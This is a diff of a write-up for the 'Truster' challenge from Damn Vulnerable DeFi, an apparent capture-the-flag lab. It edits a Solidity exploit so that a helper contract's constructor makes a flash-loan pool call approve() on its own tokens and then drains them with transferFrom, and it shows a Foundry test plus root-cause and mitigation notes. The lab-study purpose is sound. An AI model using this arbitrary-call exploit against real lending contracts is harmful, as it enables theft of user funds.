@@ -35,9 +35,9 @@ Because the pool accepts an arbitrary `target` and `data` pair and executes them
 ```javascript
 target.functionCall(data);
 ```
-an attacker can supply calldata that makes the pool call any contract, including the DVT token contract. Specifically, we can have the pool call `approve()` on the token contract, granting our attacker contract an allowance equal to the full pool balance.
+An attacker can supply calldata that makes the pool call any contract, including the DVT token contract. Specifically, we can have the pool call `approve()` on the token contract, granting our attacker contract an allowance equal to the full pool balance.
 
-Since the challenge requires the solution to occur in a single transaction, we deploy a helper contract and invoke its `attack()` function. Inside `attack()`, we first call `pool.flashLoan()` with malicious calldata to approve our contract, and then we transfer the tokens to the recovery wallet.
+Since the challenge requires the solution to occur in a single transaction, the exploit logic is executed directly inside the `constructor` of a helper contract. During deployment, the `constructor` calls `pool.flashLoan()` with malicious calldata to grant itself approval, and then immediately transfers the pool’s tokens to the recovery wallet.
 
 ### Foundry Test Example
 
@@ -45,12 +45,11 @@ Since the challenge requires the solution to occur in a single transaction, we d
 
 ```javascript
 contract RecoveryContract {
-    function attack(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 amount) external {
-        // 1. Have the pool approve this contract
+    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 amount) {
         bytes memory callDataApprove = abi.encodeWithSelector(token.approve.selector, address(this), amount);
+
         pool.flashLoan(0, msg.sender, address(token), callDataApprove);
 
-        // 2. Transfer the tokens into the recovery wallet
         token.transferFrom(address(pool), recovery, amount);
     }
 }
@@ -64,8 +63,7 @@ contract RecoveryContract {
 
         console.log("\n Deploying Recovery Contract and execute attack:... \n");
 
-        RecoveryContract recoveryContract = new RecoveryContract();
-        recoveryContract.attack(token, pool, recovery, TOKENS_IN_POOL);
+        new RecoveryContract(token, pool, recovery, TOKENS_IN_POOL);
 
         console.log("Pool DVT Balance After: ", token.balanceOf(address(pool)));
         console.log("Recovery DVT Balance After: ", token.balanceOf(recovery));
@@ -86,7 +84,7 @@ contract RecoveryContract {
   Successfully recovered all the funds from the pool.
 
 ```
-We have successfully recoverd the funds in a *single transaction*.
+We have successfully recovered the funds in a *single transaction*.
 
 ---
 
@@ -112,7 +110,7 @@ To avoid this issue, real flash loan implementations (e.g., ERC-3156) do not all
 ```javascript
 onFlashLoan(...)
 ```
-so the pool never executes user-provided code on its own behalf.
+So the pool never executes user-provided code on its own behalf.
 
 ## Root Cause
 
